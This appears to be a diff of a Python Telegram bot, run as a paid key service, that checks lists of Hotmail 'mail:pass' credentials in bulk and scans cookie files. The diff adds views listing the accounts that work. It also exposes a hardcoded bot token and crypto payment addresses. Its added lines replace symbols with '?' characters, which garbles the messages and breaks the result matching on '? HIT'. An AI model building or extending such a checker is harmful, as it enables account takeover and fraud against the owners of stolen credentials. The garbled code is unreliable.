@@ -1022,7 +1022,7 @@ PAYMENT_ACCOUNTS = {
     'ltc': 'LbqPiubpXWrL27VMUGxu2AhdvQmVA37LEL'
 }
 
-BOT_TOKEN = "8132478896:AAEFEsVHPPSbrfPLIqNtFP0CQQjTqg7DSbA"
+BOT_TOKEN = "8132478896:AAFAyuwx_uMWgcp5sI0o7deCCpGM2r-ps-E"
 ADMIN_USER_ID = "6557052839"
 CHANNEL_INVITE_LINK = os.environ.get("CHANNEL_INVITE_LINK", "https://t.me/+-XbtP90HxSE1ZjE1")
 PRIVATE_BLOCK_MESSAGE = "You must join our channel chat to use the bot."
@@ -1478,16 +1478,16 @@ async def admin_get_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
         duration_delta = parse_duration(duration_str)
         duration_formatted = format_duration(duration_delta)
         message = (
-            "┌── ⋆⋅☆⋅⋆ ── KEY BOT CHECKER ── ⋆⋅☆⋅⋆ ──┐\n\n"
-            "   ░▒▓█ KEY CREATED SUCCESSFULLY █▓▒░\n\n"
-            f"   ⫸ Key: {key}\n"
-            f"   ⫸ Duration: {duration_formatted}\n"
-            f"   ⫸ Max Users: {max_users}\n\n"
-            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n"
+            "??? ????? ?? KEY BOT CHECKER ?? ????? ???\n\n"
+            "   ???? KEY CREATED SUCCESSFULLY ????\n\n"
+            f"   ? Key: {key}\n"
+            f"   ? Duration: {duration_formatted}\n"
+            f"   ? Max Users: {max_users}\n\n"
+            "   ??????????????????????????????????\n"
             "   /activatekey\n"
-            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n\n"
-            "   ➜ STATUS: SUCCESS\n\n"
-            "└───────────────────────────────────────┘"
+            "   ??????????????????????????????????\n\n"
+            "   ? STATUS: SUCCESS\n\n"
+            "?????????????????????????????????????????"
         )
         await update.message.reply_text(message, parse_mode='Markdown')
     except Exception as e:
@@ -1539,17 +1539,17 @@ async def activate_key_command(update: Update, context: ContextTypes.DEFAULT_TYP
         error_text = str(result)
         if error_text == "Invalid or non-existent key.":
             message = (
-                "┌─── ⋆⋅☆⋅⋆ ── SYSTEM WARNING ── ⋆⋅☆⋅⋆ ───┐\n\n"
-                "   ░▒▓█ INVALID KEY DETECTED █▓▒░\n\n"
-                "   ⫸ Key: NOT FOUND\n"
-                "   ⫸ Error: The key you entered is \n"
+                "???? ????? ?? SYSTEM WARNING ?? ????? ????\n\n"
+                "   ???? INVALID KEY DETECTED ????\n\n"
+                "   ? Key: NOT FOUND\n"
+                "   ? Error: The key you entered is \n"
                 "            incorrect or does not exist.\n\n"
-                "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n"
+                "   ??????????????????????????????????\n"
                 "   Please check your key again or \n"
                 "   contact admin for support.\n"
-                "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n\n"
-                "   ➜ STATUS: FAILED ❌\n\n"
-                "└────────────────────────────────────────┘"
+                "   ??????????????????????????????????\n\n"
+                "   ? STATUS: FAILED ?\n\n"
+                "??????????????????????????????????????????"
             )
             await update.message.reply_text(message)
             return
@@ -1568,17 +1568,17 @@ async def activate_key_command(update: Update, context: ContextTypes.DEFAULT_TYP
                 except Exception:
                     expiry_str = expires_at
             message = (
-                "┌─── ⋆⋅☆⋅⋆ ── SYSTEM WARNING ── ⋆⋅☆⋅⋆ ───┐\n\n"
-                "   ░▒▓█ ACCESS DENIED █▓▒░\n\n"
-                f"   ⫸ Key: {key}\n"
-                "   ⫸ Reason: Key has expired or \n"
+                "???? ????? ?? SYSTEM WARNING ?? ????? ????\n\n"
+                "   ???? ACCESS DENIED ????\n\n"
+                f"   ? Key: {key}\n"
+                "   ? Reason: Key has expired or \n"
                 "             reached maximum usage.\n\n"
-                "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n"
-                f"   ➜ Remaining slots: {remaining_slots}\n"
-                f"   ➜ Expiry: {expiry_str}\n"
-                "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n\n"
-                "   ➜ STATUS: EXPIRED ⚠️\n\n"
-                "└────────────────────────────────────────┘"
+                "   ??????????????????????????????????\n"
+                f"   ? Remaining slots: {remaining_slots}\n"
+                f"   ? Expiry: {expiry_str}\n"
+                "   ??????????????????????????????????\n\n"
+                "   ? STATUS: EXPIRED ??\n\n"
+                "??????????????????????????????????????????"
             )
             await update.message.reply_text(message)
             return
@@ -1598,17 +1598,17 @@ async def activate_key_command(update: Update, context: ContextTypes.DEFAULT_TYP
     await update.message.reply_text(user_message)
     
     admin_message = (
-        "┌─── ⋆⋅☆⋅⋆ ── KEY ACTIVATION ── ⋆⋅☆⋅⋆ ───┐\n\n"
-        "   ░▒▓█ NOTIFICATION █▓▒░\n\n"
-        f"   ⫸ Key: {key}\n"
-        f"   ⫸ Activated by: {activation_info['first_name']} (@{activation_info['username']})\n"
-        f"   ⫸ User ID: {activation_info['user_id']}\n"
-        f"   ⫸ Time: {datetime.fromisoformat(activation_info['activated_at']).strftime('%Y-%m-%d %H:%M:%S')}\n\n"
-        "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n"
-        f"   ➜ Remaining slots: {remaining}/{max_users}\n"
-        "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n\n"
-        "   ➜ STATUS: ACTIVATED ✅\n\n"
-        "└────────────────────────────────────────┘"
+        "???? ????? ?? KEY ACTIVATION ?? ????? ????\n\n"
+        "   ???? NOTIFICATION ????\n\n"
+        f"   ? Key: {key}\n"
+        f"   ? Activated by: {activation_info['first_name']} (@{activation_info['username']})\n"
+        f"   ? User ID: {activation_info['user_id']}\n"
+        f"   ? Time: {datetime.fromisoformat(activation_info['activated_at']).strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+        "   ??????????????????????????????????\n"
+        f"   ? Remaining slots: {remaining}/{max_users}\n"
+        "   ??????????????????????????????????\n\n"
+        "   ? STATUS: ACTIVATED ?\n\n"
+        "??????????????????????????????????????????"
     )
     try:
         await context.bot.send_message(chat_id=ADMIN_USER_ID, text=admin_message)
@@ -1757,23 +1757,90 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard = [[InlineKeyboardButton("Back", callback_data="main_menu")]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            "┌─── ⋆⋅☆⋅⋆ ── HOTMAIL CHECKER ── ⋆⋅☆⋅⋆ ───┐\n\n"
-            "   ░▒▓█ SYSTEM READY █▓▒░\n\n"
-            "   ⫸ Status: 🟢 Waiting for Input\n"
-            "   ⫸ Format: mail:pass\n"
-            "   ⫸ Extension: .txt only\n\n"
-            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n"
-            "   ⚠️  INSTRUCTION:\n"
+            "???? ????? ?? HOTMAIL CHECKER ?? ????? ????\n\n"
+            "   ???? SYSTEM READY ????\n\n"
+            "   ? Status: ?? Waiting for Input\n"
+            "   ? Format: mail:pass\n"
+            "   ? Extension: .txt only\n\n"
+            "   ??????????????????????????????????\n"
+            "   ??  INSTRUCTION:\n"
             "   Please send a .txt file containing \n"
             "   hotmail in format mail:pass, \n"
             "   one per line.\n"
-            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n\n"
-            "   ➜ [✔] Auto-detect format\n"
-            "   ➜ [✔] Fast multi-threading\n"
-            "   ➜ [✔] Real-time results\n\n"
-            "└─────────────────────────────────────────┘",
+            "   ??????????????????????????????????\n\n"
+            "   ? [?] Auto-detect format\n"
+            "   ? [?] Fast multi-threading\n"
+            "   ? [?] Real-time results\n\n"
+            "???????????????????????????????????????????",
             reply_markup=reply_markup
         )
+        return
+    
+    if data == 'show_hotmail_live':
+        live_list = context.user_data.get('hotmail_live_list', [])
+        if not live_list:
+            await query.answer("No live hotmail available.", show_alert=True)
+            return
+        context.user_data['hotmail_view'] = 'full'
+        text_body = "\n".join(live_list)
+        keyboard = [[InlineKeyboardButton("Back", callback_data="back_hotmail_status")]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text(
+            "LIVE HOTMAIL LIST:\n```" + text_body + "```",
+            reply_markup=reply_markup,
+            parse_mode="Markdown"
+        )
+        return
+
+    if data == 'back_hotmail_status':
+        context.user_data['hotmail_view'] = 'status'
+        status = context.user_data.get('hotmail_status')
+        if not status:
+            await query.answer("No status to show.", show_alert=True)
+            return
+
+        total = status.get('total', 0)
+        checked = status.get('checked', 0)
+        die_count = status.get('die_count', 0)
+        live_list = status.get('live_list', [])
+        live_preview = status.get('live_preview', [])
+        bar = status.get('bar', '')
+        percent = status.get('percent', 0)
+        status_line = status.get('status_line', "? Checking...")
+
+        live_block = ""
+        if checked != total and live_preview:
+            preview_lines = "\n".join(f"   {line}" for line in live_preview)
+            live_block = (
+                "   LIVE HOTMAIL:\n"
+                f"{preview_lines}\n"
+                "   ??????????????????????????????????\n\n"
+            )
+
+        text = (
+            "???? ????? ?? CHECKING STATUS ?? ????? ???\n\n"
+            "   ???? PROCESSING LIST... ????\n\n"
+            f"   ? Total   : {total}\n"
+            f"   ? Checked : {checked}\n"
+            "   ??????????????????????????????????\n"
+            f"   ?? LIVE   : {len(live_list)}\n"
+            f"   ?? DIE    : {die_count}\n"
+            "   ??????????????????????????????????\n\n"
+            f"{live_block}"
+            f"   PROGRESS: {bar} {percent}%\n\n"
+            f"   Status: {status_line}\n\n"
+            "??????????????????????????????????????????"
+        )
+
+        keyboard_rows = []
+        if len(live_list) >= 5:
+            keyboard_rows.append([InlineKeyboardButton("Show Hotmail Live", callback_data="show_hotmail_live")])
+        reply_markup = InlineKeyboardMarkup(keyboard_rows) if keyboard_rows else None
+
+        if reply_markup:
+            await query.edit_message_text(text, reply_markup=reply_markup)
+        else:
+            await query.edit_message_text(text)
         return
 
     if data == 'admin_panel':
@@ -1864,18 +1931,18 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard = [[InlineKeyboardButton("Back", callback_data="main_menu")]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            "┌─── ⋆⋅☆⋅⋆ ── SERVICE SELECTION ── ⋆⋅☆⋅⋆ ──┐\n\n"
-            "   ░▒▓█ SCANNING CONFIG █▓▒░\n\n"
-            "   ⫸ Selected: Scan All Services\n"
-            "   ⫸ Requirement: .txt or .zip\n"
-            "   ⫸ Type: Cookie File\n\n"
-            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n"
-            "   ⚠️  ACTION REQUIRED:\n"
+            "???? ????? ?? SERVICE SELECTION ?? ????? ???\n\n"
+            "   ???? SCANNING CONFIG ????\n\n"
+            "   ? Selected: Scan All Services\n"
+            "   ? Requirement: .txt or .zip\n"
+            "   ? Type: Cookie File\n\n"
+            "   ??????????????????????????????????\n"
+            "   ??  ACTION REQUIRED:\n"
             "   Now send .txt or .zip cookie file \n"
             "   to start the scanning process.\n"
-            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n\n"
-            "   ➜ STATUS: WAITING FOR FILE... 📁\n\n"
-            "└──────────────────────────────────────────┘",
+            "   ??????????????????????????????????\n\n"
+            "   ? STATUS: WAITING FOR FILE... ??\n\n"
+            "????????????????????????????????????????????",
             reply_markup=reply_markup
         )
         return
@@ -1886,18 +1953,18 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard = [[InlineKeyboardButton("Back", callback_data="services_list")]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            "┌─── ⋆⋅☆⋅⋆ ── SERVICE SELECTION ── ⋆⋅☆⋅⋆ ──┐\n\n"
-            "   ░▒▓█ SCANNING CONFIG █▓▒░\n\n"
-            f"   ⫸ Selected: {SERVICES.get(service_key, 'Unknown')}\n"
-            "   ⫸ Requirement: .txt or .zip\n"
-            "   ⫸ Type: Cookie File\n\n"
-            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n"
-            "   ⚠️  ACTION REQUIRED:\n"
+            "???? ????? ?? SERVICE SELECTION ?? ????? ???\n\n"
+            "   ???? SCANNING CONFIG ????\n\n"
+            f"   ? Selected: {SERVICES.get(service_key, 'Unknown')}\n"
+            "   ? Requirement: .txt or .zip\n"
+            "   ? Type: Cookie File\n\n"
+            "   ??????????????????????????????????\n"
+            "   ??  ACTION REQUIRED:\n"
             "   Now send .txt or .zip cookie file \n"
             "   to start the scanning process.\n"
-            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n\n"
-            "   ➜ STATUS: WAITING FOR FILE... 📁\n\n"
-            "└──────────────────────────────────────────┘",
+            "   ??????????????????????????????????\n\n"
+            "   ? STATUS: WAITING FOR FILE... ??\n\n"
+            "????????????????????????????????????????????",
             reply_markup=reply_markup
         )
 
@@ -1977,7 +2044,7 @@ def check_hotmail_api(email, password):
     if not email or not password:
         return 'die'
     max_retry = 3
-    result = "❌ ERROR"
+    result = "? ERROR"
     for attempt in range(max_retry):
         try:
             try:
@@ -1988,7 +2055,7 @@ def check_hotmail_api(email, password):
                 except TypeError:
                     checker = OutlookChecker()
             result = checker.check(email, password)
-            if any(x in result for x in ["✅ HIT", "🆓 FREE", "❌ BAD", "Locked", "Need Verify", "Timeout"]):
+            if any(x in result for x in ["? HIT", "?? FREE", "? BAD", "Locked", "Need Verify", "Timeout"]):
                 break
             elif "Request Error" in result or "ERROR" in result:
                 if attempt + 1 >= max_retry:
@@ -1997,11 +2064,11 @@ def check_hotmail_api(email, password):
             else:
                 break
         except Exception as e:
-            result = f"❌ ERROR: {str(e)}"
+            result = f"? ERROR: {str(e)}"
             if attempt + 1 >= max_retry:
                 break
             time.sleep(1)
-    if any(x in result for x in ["✅ HIT", "🆓 FREE"]):
+    if any(x in result for x in ["? HIT", "?? FREE"]):
         return 'live'
     return 'die'
 
@@ -2067,50 +2134,106 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         live_list = []
         die_count = 0
         bar_length = 20
-        status_msg = await update.message.reply_text(
-            "┌─── ⋆⋅☆⋅⋆ ── CHECKING STATUS ── ⋆⋅☆⋅⋆ ──┐\n\n"
-            "   ░▒▓█ PROCESSING LIST... █▓▒░\n\n"
-            f"   ⫸ Total   : {total}\n"
-            "   ⫸ Checked : 0\n"
-            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n"
-            "   🟢 LIVE   : 0\n"
-            "   🔴 DIE    : 0\n"
-            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n\n"
-            f"   PROGRESS: [{'░' * bar_length}] 0%\n\n"
-            "   Status: ⏳ Checking...\n\n"
-            "└────────────────────────────────────────┘"
-        )
+        live_preview = []
+        context.user_data['hotmail_live_list'] = []
+        context.user_data['hotmail_status'] = {}
+        context.user_data['hotmail_view'] = 'status'
 
+        status_msg = await update.message.reply_text(
+            "???? ????? ?? CHECKING STATUS ?? ????? ???\n\n"
+            "   ???? PROCESSING LIST... ????\n\n"
+            f"   ? Total   : {total}\n"
+            "   ? Checked : 0\n"
+            "   ??????????????????????????????????\n"
+            "   ?? LIVE   : 0\n"
+            "   ?? DIE    : 0\n"
+            "   ??????????????????????????????????\n\n"
+            f"   PROGRESS: [{'?' * bar_length}] 0%\n\n"
+            "   Status: ? Checking...\n\n"
+            "??????????????????????????????????????????"
+        )
 
         for idx, (email, password, original_line) in enumerate(accounts, start=1):
             result = await asyncio.to_thread(check_hotmail_api, email, password)
             if result == 'live':
                 live_list.append(original_line)
+                live_preview.append(original_line)
+                if len(live_preview) > 5:
+                    live_preview = live_preview[-5:]
             else:
                 die_count += 1
+
+            context.user_data['hotmail_live_list'] = live_list.copy()
+
             checked = idx
             filled = int(bar_length * checked / total)
-            bar = "[" + "█" * filled + "░" * (bar_length - filled) + "]"
+            bar = "[" + "?" * filled + "?" * (bar_length - filled) + "]"
             percent = int(checked * 100 / total)
-            status_line = "✅ Task Completed!" if checked == total else "⏳ Checking..."
-            text = (
-                    "┌─── ⋆⋅☆⋅⋆ ── CHECKING STATUS ── ⋆⋅☆⋅⋆ ──┐\n\n"
-                    "   ░▒▓█ PROCESSING LIST... █▓▒░\n\n"
-                    f"   ⫸ Total   : {total}\n"
-                    f"   ⫸ Checked : {checked}\n"
-                    "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n"
-                    f"   🟢 LIVE   : {len(live_list)}\n"
-                    f"   🔴 DIE    : {die_count}\n"
-                    "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n\n"
+            status_line = "? Task Completed!" if checked == total else "? Checking..."
+            context.user_data['hotmail_status'] = {
+                'total': total,
+                'checked': checked,
+                'die_count': die_count,
+                'live_list': live_list.copy(),
+                'live_preview': live_preview.copy(),
+                'bar': bar,
+                'percent': percent,
+                'status_line': status_line,
+            }
+
+            view = context.user_data.get('hotmail_view', 'status')
+
+            if view == 'status':
+                live_block = ""
+                if checked != total and live_preview:
+                    preview_lines = "\n".join(f"   {line}" for line in live_preview)
+                    live_block = (
+                        "   LIVE HOTMAIL:\n"
+                        f"{preview_lines}\n"
+                        "   ??????????????????????????????????\n\n"
+                    )
+
+                text = (
+                    "???? ????? ?? CHECKING STATUS ?? ????? ???\n\n"
+                    "   ???? PROCESSING LIST... ????\n\n"
+                    f"   ? Total   : {total}\n"
+                    f"   ? Checked : {checked}\n"
+                    "   ??????????????????????????????????\n"
+                    f"   ?? LIVE   : {len(live_list)}\n"
+                    f"   ?? DIE    : {die_count}\n"
+                    "   ??????????????????????????????????\n\n"
+                    f"{live_block}"
                     f"   PROGRESS: {bar} {percent}%\n\n"
                     f"   Status: {status_line}\n\n"
-                    "└────────────────────────────────────────┘"
-            )
-            try:
-                await status_msg.edit_text(text)
-            except Exception:
-                pass
+                    "??????????????????????????????????????????"
+                )
 
+                keyboard_rows = []
+                if len(live_list) >= 5:
+                    keyboard_rows.append([InlineKeyboardButton("Show Hotmail Live", callback_data="show_hotmail_live")])
+                reply_markup = InlineKeyboardMarkup(keyboard_rows) if keyboard_rows else None
+
+                try:
+                    if reply_markup:
+                        await status_msg.edit_text(text, reply_markup=reply_markup)
+                    else:
+                        await status_msg.edit_text(text)
+                except Exception:
+                    pass
+
+            elif view == 'full':
+                live_list_full = context.user_data.get('hotmail_live_list', [])
+                text_body = "\n".join(live_list_full) if live_list_full else ""
+                keyboard = [[InlineKeyboardButton("Back", callback_data="back_hotmail_status")]]
+                reply_markup = InlineKeyboardMarkup(keyboard)
+                try:
+                    await status_msg.edit_text(
+                        "LIVE HOTMAIL LIST:\n```" + text_body + "```",
+                        reply_markup=reply_markup,
+                        parse_mode="Markdown"
+                    )
+                except Exception:
+                    pass
 
         if live_list:
             output = "\n".join(live_list)
